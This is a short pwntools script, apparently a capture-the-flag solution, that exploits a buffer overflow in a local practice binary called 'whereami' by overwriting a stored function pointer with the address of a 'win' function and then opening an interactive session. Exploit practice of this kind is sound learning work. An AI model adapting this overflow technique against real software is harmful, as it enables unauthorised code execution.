from pwn import *

p = process('./whereami')
elf = p.elf

# we can either grab the function pointer from the output
if True:
    p.recvuntil(b'at ')
    win = int(p.recvline(), 16)
# or just grab it directly from the elf symbols
else:
    win = elf.symbols['win']

# Note: we can't overwrite the return address directly, as the function jumps to the address stored at buffer + 64
payload = b'A' * 0x40
payload += p32(win)

p.sendlineafter(b'?\n', payload)

p.interactive()
p.close()